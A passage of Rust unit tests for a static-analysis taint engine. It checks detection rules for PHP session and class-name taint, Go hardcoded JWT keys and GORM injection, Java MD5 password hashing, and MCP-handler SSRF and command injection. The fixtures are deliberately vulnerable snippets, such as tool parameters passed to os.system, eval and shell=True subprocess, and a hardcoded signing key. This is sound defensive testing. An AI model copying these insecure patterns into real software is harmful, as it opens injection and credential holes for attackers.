        // And it is gated to PHP: other languages do not compile it (they have
        // no type-juggling comparison sink).
        assert!(compile_pattern("$A == $B", MatcherRole::Sink, Language::Java).is_none());
        // Strict equality never compiles as a LooseEquality sink.
        assert!(compile_pattern("$A === $B", MatcherRole::Sink, Language::Php).is_none());
        assert!(compile_pattern("$A !== $B", MatcherRole::Sink, Language::Php).is_none());
        // Assignment is not a comparison.
        assert!(!is_loose_equality_pattern("$A = $B"));
        // Loose forms are recognized.
        assert!(is_loose_equality_pattern("$A == $B"));
        assert!(is_loose_equality_pattern("$A != $B"));
    }

    // ── PHP tainted CLASS-NAME instantiation SINK (`tainted-object-instantiation`) ─
    //
    // The whole `parse_taint_rule -> compiled() -> check()` path: an
    // attacker-controlled CLASS NAME in `new $SINK(...)` fires; a tainted
    // constructor ARGUMENT (`new SafeClass($tainted)`) or a class-name variable
    // holding a literal (`$a = "C"; new $a()`) stays silent — the faithfulness
    // requirement (the taint is the class-name selector, not an argument).

    /// The real registry `tainted-object-instantiation` rule shape.
    const TAINTED_OBJECT_INSTANTIATION_RULE: &str = r#"
id: tainted-object-instantiation
mode: taint
languages: [php]
severity: WARNING
message: "A new object is created where the class name is based on user input."
pattern-sources:
  - patterns:
    - pattern-either:
      - pattern: $_GET
      - pattern: $_POST
      - pattern: $_COOKIE
      - pattern: $_REQUEST
      - pattern: $_SERVER
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern-inside: new $SINK(...)
    - pattern: $SINK
"#;

    #[test]
    fn tainted_object_instantiation_loads() {
        let rule = compiled(TAINTED_OBJECT_INSTANTIATION_RULE);
        assert!(
            rule.spec
                .sinks
                .iter()
                .any(|s| matches!(s, GenericMatcher::TaintedCallee { .. })),
            "expected a TaintedCallee sink, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn tainted_object_instantiation_fires_on_tainted_classname() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_OBJECT_INSTANTIATION_RULE);
        // The CLASS NAME is attacker-controlled; the constructor argument is a
        // safe literal — the class-name taint alone must fire.
        let src = "<?php\nfunction f(){\n  $n = $_GET['c'];\n  $ctrl = new $n('safe');\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert_eq!(
            rule.check(src, &tree).len(),
            1,
            "a tainted class name in `new $n(...)` must fire"
        );
    }

    #[test]
    fn tainted_object_instantiation_silent_on_tainted_argument() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_OBJECT_INSTANTIATION_RULE);
        // The CLASS NAME is a concrete identifier; only a constructor ARGUMENT is
        // tainted. This is a DIFFERENT sink shape and must NOT fire here (the
        // faithfulness discrimination — near-miss on the argument position).
        let src = "<?php\nfunction f(){\n  $ctrl = new SafeController($_GET['c']);\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "a tainted constructor ARGUMENT (concrete class name) must NOT fire, got {:?}",
            rule.check(src, &tree)
        );
    }

    #[test]
    fn tainted_object_instantiation_silent_on_literal_classname() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_OBJECT_INSTANTIATION_RULE);
        // The class-name variable holds a string literal — untainted → no fire.
        let src = "<?php\nfunction f(){\n  $a = 'MyController';\n  $ctrl = new $a();\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "a literal-valued class-name variable must NOT fire"
        );
    }

    #[test]
    fn tainted_callee_compile_discrimination() {
        // `new $MV(...)` yields the class-name metavariable; a concrete class
        // name does not.
        assert_eq!(
            parse_new_metavar_classname("new $SINK(...)").as_deref(),
            Some("$SINK")
        );
        assert!(parse_new_metavar_classname("new SafeClass(...)").is_none());

        // The recognizer compiles ONLY when the focus names the class-name
        // metavariable — a focus on a constructor ARGUMENT does not.
        let classname_focus: YamlValue = serde_yaml_ng::from_str(
            "- pattern-either:\n    - pattern-inside: new $SINK(...)\n- pattern: $SINK\n",
        )
        .unwrap();
        let mut out = Vec::new();
        assert!(try_compile_tainted_callee_sink_block(
            &classname_focus,
            MatcherRole::Sink,
            &mut out
        ));
        assert!(matches!(out[0], GenericMatcher::TaintedCallee { .. }));

        let arg_focus: YamlValue =
            serde_yaml_ng::from_str("- pattern-inside: new SafeClass($ARG)\n- pattern: $ARG\n")
                .unwrap();
        let mut out2 = Vec::new();
        assert!(
            !try_compile_tainted_callee_sink_block(&arg_focus, MatcherRole::Sink, &mut out2),
            "a constructor-argument focus must NOT compile a TaintedCallee sink"
        );
        assert!(out2.is_empty());
    }

    // ── PHP tainted SUBSCRIPT-KEY assignment SINK (`tainted-session`) ────────────
    //
    // An attacker-controlled session KEY in `$_SESSION[$KEY] = $VAL` fires; a
    // tainted assigned VALUE (`$_SESSION["safe"] = $tainted`) or a nested-base
    // write (`$_SESSION["prefix"][$tainted] = …`) stays silent — the taint is the
    // subscript KEY of the assignment TARGET, not the value.

    /// The real registry `tainted-session` rule shape (trimmed sanitizer list).
    const TAINTED_SESSION_RULE: &str = r#"
id: tainted-session
mode: taint
languages: [php]
severity: WARNING
message: "Session key based on user input risks session poisoning."
pattern-sources:
  - patterns:
    - pattern-either:
      - pattern: $_GET
      - pattern: $_POST
      - pattern: $_COOKIE
      - pattern: $_REQUEST
pattern-sanitizers:
  - patterns:
    - pattern-either:
      - pattern: md5(...)
pattern-sinks:
  - patterns:
    - pattern-inside: $_SESSION[$KEY] = $VAL;
    - pattern: $KEY
"#;

    #[test]
    fn tainted_session_loads() {
        let rule = compiled(TAINTED_SESSION_RULE);
        assert!(
            rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::TaintedSubscriptKey { base: Some(b), .. } if b == "_SESSION"
            )),
            "expected a TaintedSubscriptKey{{_SESSION}} sink, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn tainted_session_fires_on_tainted_key_direct() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_SESSION_RULE);
        let src = "<?php\nfunction f(){\n  $_SESSION[$_POST['input']] = true;\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert_eq!(
            rule.check(src, &tree).len(),
            1,
            "a tainted session KEY (direct source) must fire"
        );
    }

    #[test]
    fn tainted_session_fires_on_tainted_key_via_variable() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_SESSION_RULE);
        let src = "<?php\nfunction f(){\n  $k = $_POST['input'];\n  $_SESSION[$k] = true;\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert_eq!(
            rule.check(src, &tree).len(),
            1,
            "a tainted session KEY (via a propagated variable) must fire"
        );
    }

    #[test]
    fn tainted_session_silent_on_tainted_value() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_SESSION_RULE);
        // The KEY is a literal; only the assigned VALUE is tainted. This is a
        // DIFFERENT flow and must NOT fire here (the faithfulness discrimination
        // — near-miss on the value position).
        let src = "<?php\nfunction f(){\n  $_SESSION['key'] = $_POST['input'];\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "a tainted assigned VALUE (literal key) must NOT fire, got {:?}",
            rule.check(src, &tree)
        );
    }

    #[test]
    fn tainted_session_silent_on_nested_base() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_SESSION_RULE);
        // The assignment target base is `$_SESSION['prefix']`, NOT `$_SESSION`
        // directly — the `pattern-inside: $_SESSION[$KEY]` context does not match,
        // so this must NOT fire.
        let src = "<?php\nfunction f(){\n  $_SESSION['prefix'][$_POST['input']] = true;\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "a nested-base session write must NOT fire, got {:?}",
            rule.check(src, &tree)
        );
    }

    #[test]
    fn tainted_session_silent_on_sanitized_key() {
        use crate::engine::parser::parse_file;
        let rule = compiled(TAINTED_SESSION_RULE);
        // `md5(...)` sanitizes the key before it reaches the session write.
        let src =
            "<?php\nfunction f(){\n  $k = md5($_POST['input']);\n  $_SESSION[$k] = true;\n}\n";
        let tree = parse_file(src, Language::Php).expect("php fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "an md5-sanitized session key must NOT fire"
        );
    }

    #[test]
    fn subscript_key_compile_discrimination() {
        // `$_SESSION[$KEY] = $VAL` parses to (base, key, val).
        let parsed = parse_subscript_key_assignment("$_SESSION[$KEY] = $VAL;").unwrap();
        assert_eq!(parsed.0.as_deref(), Some("_SESSION"));
        assert_eq!(parsed.1, "$KEY");
        assert_eq!(parsed.2, "$VAL");

        // The recognizer compiles ONLY when the focus names the KEY metavariable.
        let key_focus: YamlValue =
            serde_yaml_ng::from_str("- pattern-inside: $_SESSION[$KEY] = $VAL;\n- pattern: $KEY\n")
                .unwrap();
        let mut out = Vec::new();
        assert!(try_compile_subscript_key_sink_block(
            &key_focus,
            MatcherRole::Sink,
            &mut out
        ));
        assert!(matches!(
            out[0],
            GenericMatcher::TaintedSubscriptKey { base: Some(ref b), .. } if b == "_SESSION"
        ));

        // A focus on the assigned VALUE must NOT compile a TaintedSubscriptKey.
        let val_focus: YamlValue =
            serde_yaml_ng::from_str("- pattern-inside: $_SESSION[$KEY] = $VAL;\n- pattern: $VAL\n")
                .unwrap();
        let mut out2 = Vec::new();
        assert!(
            !try_compile_subscript_key_sink_block(&val_focus, MatcherRole::Sink, &mut out2),
            "an assigned-value focus must NOT compile a TaintedSubscriptKey sink"
        );
        assert!(out2.is_empty());
    }

    // ── Go `hardcoded-jwt-key` (`[]byte("$F")` literal source → SignedString) ─
    //
    // The registry `hardcoded-jwt-key` rule's source is a hardcoded byte-slice
    // literal (`pattern-inside: []byte("$F")`) flowing into a JWT signer
    // (`$TOKEN.SignedString($F)`). These exercise the whole
    // `parse_taint_rule -> compiled() -> check()` path.

    const GO_HARDCODED_JWT_RULE: &str = r#"
id: hardcoded-jwt-key
mode: taint
languages: [go]
severity: WARNING
message: A hard-coded credential was detected.
pattern-sources:
- patterns:
  - pattern-inside: |
      []byte("$F")
pattern-sinks:
- patterns:
  - pattern-either:
    - pattern-inside: |
        $TOKEN.SignedString($F)
  - focus-metavariable: $F
"#;

    #[test]
    fn go_hardcoded_jwt_key_compiles_literal_source_and_signedstring_sink() {
        let rule = compiled(GO_HARDCODED_JWT_RULE);
        assert!(
            rule.spec
                .sources
                .iter()
                .any(|s| matches!(s, GenericMatcher::LiteralString { regex: None, .. })),
            "source should compile to a LiteralString (any string literal), got {:?}",
            rule.spec.sources
        );
        assert!(
            rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::MethodName { method, .. } if method == "SignedString"
            )),
            "sink should compile to MethodName{{SignedString}}, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn go_hardcoded_jwt_key_fires_on_var_and_inline_literals() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_HARDCODED_JWT_RULE);
        // Both fixture positives: a `[]byte("...")` bound to a var and flowed to
        // SignedString, and an inline `[]byte("...")` argument.
        let src = r#"
package main
func Signin(token T) {
    var jwtKey = []byte("my_secret_key")
    tokenString, _ := token.SignedString(jwtKey)
    _ = tokenString
    tokenString2, _ := token.SignedString([]byte("my_secret_key"))
    _ = tokenString2
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            2,
            "both a var-bound and an inline hardcoded []byte key must fire, got {findings:?}"
        );
    }

    #[test]
    fn go_hardcoded_jwt_key_silent_on_env_key_and_clean_code() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_HARDCODED_JWT_RULE);
        // Near-miss discriminator: the key comes from the environment (a
        // non-literal), so SignedString must NOT fire; and unrelated clean code
        // with a string literal not reaching the signer stays silent.
        let src = r#"
package main
import "os"
func Signin(token T) {
    jwtKey := []byte(os.Getenv("JWT_KEY"))
    tokenString, _ := token.SignedString(jwtKey)
    _ = tokenString
    msg := "hello world"
    _ = msg
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "an env-derived signing key and an unrelated literal must not fire, got {findings:?}"
        );
    }

    // ── Go `gorm-dangerous-method-usage` (request → dangerous GORM method) ────
    //
    // Source: a value read off an `*http.Request`-typed parameter. Sink: a call
    // to a dangerous GORM query method (`$GORM. ... .$METHOD($VALUE)` with
    // `$METHOD` pinned to `Order|Exec|Raw|Group|Having|Distinct|Select|Pluck`)
    // carrying a tainted argument. The deep-wildcard chain + method-name regex
    // is the shape that was previously skipped.

    const GO_GORM_RULE: &str = r#"
id: gorm-dangerous-method-usage
mode: taint
languages: [go]
severity: WARNING
message: Detected usage of dangerous method $METHOD.
pattern-sources:
- patterns:
  - pattern-either:
    - pattern: |
        ($REQUEST : http.Request).$ANYTHING
    - pattern: |
        ($REQUEST : *http.Request).$ANYTHING
  - metavariable-regex:
      metavariable: $ANYTHING
      regex: ^(BasicAuth|Body|Cookie|Cookies|Form|FormValue|GetBody|Host|MultipartReader|ParseForm|ParseMultipartForm|PostForm|PostFormValue|Referer|RequestURI|Trailer|TransferEncoding|UserAgent|URL)$
pattern-sinks:
- patterns:
  - pattern-inside: |
      import ("gorm.io/gorm")
      ...
  - patterns:
    - pattern-inside: |
        func $VAL(..., $GORM *gorm.DB,... ) {
          ...
        }
    - pattern-either:
      - pattern: |
          $GORM. ... .$METHOD($VALUE)
      - pattern: |
          $DB := $GORM. ... .$ANYTHING(...)
          ...
          $DB. ... .$METHOD($VALUE)
  - focus-metavariable: $VALUE
  - metavariable-regex:
      metavariable: $METHOD
      regex: ^(Order|Exec|Raw|Group|Having|Distinct|Select|Pluck)$
pattern-sanitizers:
- pattern-either:
  - pattern: strconv.Atoi(...)
  - pattern: |
      ($X: bool)
"#;

    #[test]
    fn go_gorm_compiles_enumerated_method_name_sinks_and_typed_source() {
        let rule = compiled(GO_GORM_RULE);
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "http.Request"
            )),
            "source should compile to TypedName{{http.Request}}, got {:?}",
            rule.spec.sources
        );
        for want in [
            "Order", "Exec", "Raw", "Group", "Having", "Distinct", "Select", "Pluck",
        ] {
            assert!(
                rule.spec.sinks.iter().any(|s| matches!(
                    s,
                    GenericMatcher::MethodName { method, .. } if method == want
                )),
                "sink should include MethodName{{{want}}}, got {:?}",
                rule.spec.sinks
            );
        }
        // Precision: the broad `Find`/`Table` methods (present in the fixture but
        // NOT in the regex set) must NOT be sinks.
        assert!(
            !rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::MethodName { method, .. } if method == "Find" || method == "Table"
            )),
            "non-listed methods must not become sinks, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn go_gorm_fires_on_request_tainted_order() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_GORM_RULE);
        // testInjection: r.Cookie(...) → .Order(param).  testInjection2:
        // r.URL.Query().Get(...) → .Order(param + " " + "ASC").
        let src = r#"
package main
import (
    "net/http"
    "gorm.io/gorm"
)
func testInjection(w http.ResponseWriter, r *http.Request, db *gorm.DB) {
    param := r.Cookie("foo")
    table := db.Table("users")
    var u User
    table.Order(param).Find(&u)
}
func testInjection2(w http.ResponseWriter, r *http.Request, db *gorm.DB) {
    param := r.URL.Query().Get("orderBy")
    table := db.Table("users")
    var u User
    table.Order(param + " " + "ASC").Find(&u)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            2,
            "both request-tainted .Order(...) calls must fire, got {findings:?}"
        );
    }

    #[test]
    fn go_gorm_silent_on_constant_local_and_bool_comparison() {
        use crate::engine::parser::parse_file;
        let rule = compiled(GO_GORM_RULE);
        // testNoInjection: constant arg. testNoInjection2: a local string var.
        // testNoInjection3: a boolean comparison `(param != "param")` — the taint
        // must stop at the `!=` predicate (the `($X: bool)` sanitizer's intent).
        let src = r#"
package main
import (
    "net/http"
    "gorm.io/gorm"
)
func testNoInjection(w http.ResponseWriter, r *http.Request, db *gorm.DB) {
    table := db.Table("users")
    var u User
    table.Order("email").Find(&u)
}
func testNoInjection2(w http.ResponseWriter, r *http.Request, db *gorm.DB) {
    table := db.Table("users")
    var orderBy = "email"
    var u User
    table.Order(orderBy).Find(&u)
}
func testNoInjection3(w http.ResponseWriter, r *http.Request, db *gorm.DB) {
    param := r.URL.Query().Get("orderBy")
    table := db.Table("users")
    var u User
    table.Order((param != "param") + " " + "ASC").Find(&u)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "constant / local-var / bool-comparison args must not fire, got {findings:?}"
        );
    }
    // ── Java `md5-used-as-password` (receiver-provenance source) ─────────────
    //
    // Compile the REAL registry rule through `parse_taint_rule` and run it:
    // `$MD.digest(...)` where `$MD = MessageDigest.getInstance("MD5")` flows into
    // a `*password*` method. The SHA-256 near-miss must stay silent.

    const MD5_RULE: &str = r#"
id: md5-used-as-password
languages: [java]
severity: WARNING
message: MD5 used as a password hash.
mode: taint
pattern-sources:
- patterns:
  - pattern-inside: |
      $TYPE $MD = MessageDigest.getInstance("MD5");
      ...
  - pattern: $MD.digest(...);
pattern-sinks:
- patterns:
  - pattern: $MODEL.$METHOD(...);
  - metavariable-regex:
      metavariable: $METHOD
      regex: (?i)(.*password.*)
"#;

    #[test]
    fn md5_rule_compiles_to_provenance_source_and_method_regex_sink() {
        let rule = compiled(MD5_RULE);
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ReceiverProvenanceCall {
                    init_receiver, init_method, init_arg, method, ..
                }] if init_receiver == "MessageDigest"
                    && init_method == "getInstance"
                    && init_arg == "MD5"
                    && method == "digest"
            ),
            "expected a ReceiverProvenanceCall source, got {:?}",
            rule.spec.sources
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::MethodNameRegex { .. }]
            ),
            "expected a MethodNameRegex sink, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn md5_rule_fires_on_md5_digest_into_password() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_RULE);
        let src = r#"
class UserController {
    void addUser(UserModel user) throws Exception {
        String salt = RandomUtil.createSalt();
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(user.getPassword());
        user.setPassword(md.digest(), salt);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "MD5 digest into setPassword must fire once, got {findings:?}"
        );
    }

    #[test]
    fn md5_rule_silent_on_sha256_near_miss() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_RULE);
        let src = r#"
class UserController {
    void addUserOk(UserModel user) throws Exception {
        String salt = RandomUtil.createSalt();
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        md.update(user.getPassword());
        user.setPassword(md.digest(), salt);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "SHA-256 digest must NOT fire (discriminator), got {findings:?}"
        );
    }

    #[test]
    fn md5_rule_silent_on_unrelated_clean_code() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MD5_RULE);
        let src = r#"
class Foo {
    void bar(String x) {
        System.out.println(x);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java parses");
        assert!(rule.check(src, &tree).is_empty());
    }

    // ── Java `tainted-session-from-http-request` (positional-arg sink) ───────
    //
    // Compile the REAL registry rule and run it: only a tainted session VALUE
    // (the focused 2nd argument) fires; a tainted KEY with a literal value stays
    // silent. Exercises the TypedName source, for-each cookie propagation, and
    // the positional `MethodArgSink`.

    const SESSION_RULE: &str = r#"
id: tainted-session-from-http-request
languages: [java]
severity: WARNING
message: Tainted input into a session command.
mode: taint
pattern-sources:
- patterns:
  - pattern-either:
    - patterns:
      - pattern: |
          (HttpServletRequest $REQ).$FUNC(...)
      - pattern-not: |
          (HttpServletRequest $REQ).getSession()
pattern-sinks:
  - patterns:
    - pattern: (HttpServletRequest $REQ).getSession().$FUNC($NAME, $VALUE);
    - metavariable-regex:
        metavariable: $FUNC
        regex: ^(putValue|setAttribute)$
    - focus-metavariable: $VALUE
options:
  interfile: true
"#;

    #[test]
    fn session_rule_compiles_to_typedname_source_and_method_arg_sink() {
        let rule = compiled(SESSION_RULE);
        assert!(
            rule.spec
                .sources
                .iter()
                .any(|m| matches!(m, GenericMatcher::TypedName { type_name, .. }
                    if type_name == "HttpServletRequest")),
            "expected a TypedName(HttpServletRequest) source, got {:?}",
            rule.spec.sources
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::MethodArgSink { methods, arg_index, .. }]
                    if *arg_index == 1
                        && methods.contains(&"setAttribute".to_string())
                        && methods.contains(&"putValue".to_string())
            ),
            "expected a MethodArgSink(arg 1) sink, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn session_rule_fires_on_tainted_value_not_tainted_key_via_cookie_loop() {
        use crate::engine::parser::parse_file;
        let rule = compiled(SESSION_RULE);
        // `param` is tainted via the cookie for-each loop; the tainted-KEY call
        // (value is a literal) must NOT fire, the tainted-VALUE call must.
        let src = r#"
class T {
    void doPost(HttpServletRequest request) throws Exception {
        javax.servlet.http.Cookie[] theCookies = request.getCookies();
        String param = "none";
        if (theCookies != null) {
            for (javax.servlet.http.Cookie theCookie : theCookies) {
                param = java.net.URLDecoder.decode(theCookie.getValue(), "UTF-8");
            }
        }
        request.getSession().setAttribute(param, "10340");
        request.getSession().setAttribute("param", param);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "only the tainted-VALUE setAttribute must fire, got {findings:?}"
        );
    }

    #[test]
    fn session_rule_fires_on_tainted_value_via_header_path() {
        use crate::engine::parser::parse_file;
        let rule = compiled(SESSION_RULE);
        let src = r#"
class T {
    void doPost(HttpServletRequest request) throws Exception {
        String param = "";
        java.util.Enumeration<String> headers = request.getHeaders("H");
        if (headers != null && headers.hasMoreElements()) {
            param = headers.nextElement();
        }
        param = java.net.URLDecoder.decode(param, "UTF-8");
        String bar = org.owasp.esapi.ESAPI.encoder().encodeForHTML(param);
        request.getSession().putValue(bar, "10340");
        request.getSession().putValue(bar, bar);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "only the tainted-VALUE putValue must fire, got {findings:?}"
        );
    }

    #[test]
    fn session_rule_silent_on_clean_literal_decode() {
        use crate::engine::parser::parse_file;
        let rule = compiled(SESSION_RULE);
        // `param` is decoded from a literal, never from the request — clean.
        let src = r#"
class T {
    void doPost(HttpServletRequest request) throws Exception {
        String param = java.net.URLDecoder.decode("hello", "UTF-8");
        request.getSession().setAttribute("param", param);
        request.getSession().setAttribute(param, "10340");
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a literal-derived value must NOT fire, got {findings:?}"
        );
    }

    // ── MCP decorated-parameter source (`@$SERVER.tool()`) ────────────────────

    const MCP_SSRF_RULE: &str = r#"
id: mcp-ssrf-python
mode: taint
languages: [python]
severity: ERROR
message: MCP handler input flows into an HTTP request URL.
pattern-sources:
  - patterns:
      - pattern: |
          @$SERVER.tool()
          def $FUNC(..., $PARAM, ...):
              ...
      - focus-metavariable: $PARAM
pattern-sinks:
  - patterns:
      - pattern: requests.get($SINK, ...)
      - focus-metavariable: $SINK
  - patterns:
      - pattern: requests.post($SINK, ...)
      - focus-metavariable: $SINK
  - patterns:
      - pattern: urllib.request.urlopen($SINK)
      - focus-metavariable: $SINK
pattern-sanitizers:
  - pattern: urllib.parse.urlparse(...)
"#;

    const MCP_CMDINJ_RULE: &str = r#"
id: mcp-command-injection-python
mode: taint
languages: [python]
severity: ERROR
message: MCP handler input flows into a command execution sink.
pattern-sources:
  - patterns:
      - pattern: |
          @$SERVER.tool()
          def $FUNC(..., $PARAM, ...):
              ...
      - focus-metavariable: $PARAM
pattern-sinks:
  - patterns:
      - pattern: os.system($SINK)
      - focus-metavariable: $SINK
  - patterns:
      - pattern: eval($SINK)
      - focus-metavariable: $SINK
  - patterns:
      - pattern: exec($SINK)
      - focus-metavariable: $SINK
pattern-sanitizers:
  - pattern: shlex.quote(...)
"#;

    #[test]
    fn mcp_source_compiles_to_decorated_param_source() {
        let rule = compiled(MCP_SSRF_RULE);
        assert!(
            rule.spec.sources.iter().any(
                |m| matches!(m, GenericMatcher::DecoratedParamSource { decorator, .. }
                    if decorator == "tool")
            ),
            "expected a DecoratedParamSource(tool) source, got {:?}",
            rule.spec.sources
        );
        // Sinks must be concrete Call matchers for the HTTP funcs.
        assert!(
            rule.spec
                .sinks
                .iter()
                .any(|m| matches!(m, GenericMatcher::Call { canonical, .. }
                    if canonical == "requests.get")),
            "expected a requests.get Call sink, got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn mcp_ssrf_fires_on_decorated_handler_param() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MCP_SSRF_RULE);
        let src = r#"
import requests
@mcp.tool()
def fetch_url(url: str) -> str:
    response = requests.get(url)
    return response.text
"#;
        let tree = parse_file(src, Language::Python).expect("py parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted MCP param must reach requests.get, got {findings:?}"
        );
    }

    #[test]
    fn mcp_ssrf_silent_on_undecorated_function() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MCP_SSRF_RULE);
        // No `@x.tool()` decorator → the parameter is NOT an MCP source. The
        // discriminator the rule relies on; must be silent even though `url`
        // structurally reaches requests.get.
        let src = r#"
import requests
def fetch_url(url: str) -> str:
    response = requests.get(url)
    return response.text
"#;
        let tree = parse_file(src, Language::Python).expect("py parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "undecorated function param must NOT fire, got {findings:?}"
        );
    }

    #[test]
    fn mcp_ssrf_silent_on_wrong_decorator() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MCP_SSRF_RULE);
        // Decorated, but with `@app.route(...)`, not `.tool()` → not an MCP
        // handler; the `tool` discriminator must keep it silent.
        let src = r#"
import requests
@app.route("/x")
def fetch_url(url: str) -> str:
    response = requests.get(url)
    return response.text
"#;
        let tree = parse_file(src, Language::Python).expect("py parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "non-tool decorator must NOT fire, got {findings:?}"
        );
    }

    #[test]
    fn mcp_ssrf_silent_on_sanitized_and_hardcoded() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MCP_SSRF_RULE);
        // urlparse sanitizer + a no-param hardcoded fetch: both `ok` in fixture.
        let src = r#"
import requests
import urllib.parse
@mcp.tool()
def safe_fetch(url: str) -> str:
    parsed = urllib.parse.urlparse(url)
    response = requests.get(parsed.geturl())
    return response.text

@mcp.tool()
def hardcoded_fetch() -> str:
    response = requests.get("https://api.example.com/data")
    return response.text
"#;
        let tree = parse_file(src, Language::Python).expect("py parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "sanitized + hardcoded must NOT fire, got {findings:?}"
        );
    }

    #[test]
    fn mcp_cmdinj_fires_on_os_system_and_eval() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MCP_CMDINJ_RULE);
        let src = r#"
import os
@mcp.tool()
def run_command(cmd: str) -> str:
    os.system(cmd)
    return "done"

@mcp.tool()
def eval_expr(expr: str) -> str:
    result = eval(expr)
    return str(result)
"#;
        let tree = parse_file(src, Language::Python).expect("py parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            2,
            "os.system(cmd) and eval(expr) must both fire, got {findings:?}"
        );
    }

    #[test]
    fn mcp_cmdinj_subprocess_shell_true_fires() {
        use crate::engine::parser::parse_file;
        // The real rule's subprocess sink `subprocess.run($SINK, ..., shell=True)`
        // compiles to a broad `Call { subprocess.run }` (the `shell=True` keyword
        // constraint is dropped, exactly as the already-shipped sibling rule
        // `llm-output-to-exec-python` does). It fires on the fixture's shell=True
        // positive; no fixture `ok` case is a tainted subprocess call, so this
        // broadening never over-matches a fixture-marked-safe line.
        let rule = compiled(
            r#"
id: mcp-command-injection-python
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern: |
          @$SERVER.tool()
          def $FUNC(..., $PARAM, ...):
              ...
      - focus-metavariable: $PARAM
pattern-sinks:
  - patterns:
      - pattern: subprocess.run($SINK, ..., shell=True, ...)
      - focus-metavariable: $SINK
"#,
        );
        let src = "import subprocess\n@mcp.tool()\ndef f(command: str):\n    subprocess.run(command, shell=True)\n";
        let tree = parse_file(src, Language::Python).unwrap();
        assert_eq!(
            rule.check(src, &tree).len(),
            1,
            "shell=True subprocess sink must fire on the tainted MCP param"
        );
    }

    #[test]
    fn mcp_cmdinj_silent_on_sanitized_and_undecorated() {
        use crate::engine::parser::parse_file;
        let rule = compiled(MCP_CMDINJ_RULE);
        let src = r#"
import os
import shlex
@mcp.tool()
def safe_quoted(cmd: str) -> str:
    safe_cmd = shlex.quote(cmd)
    os.system(safe_cmd)
    return "done"

def helper(cmd: str) -> str:
    os.system(cmd)
    return "done"
"#;
        let tree = parse_file(src, Language::Python).expect("py parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
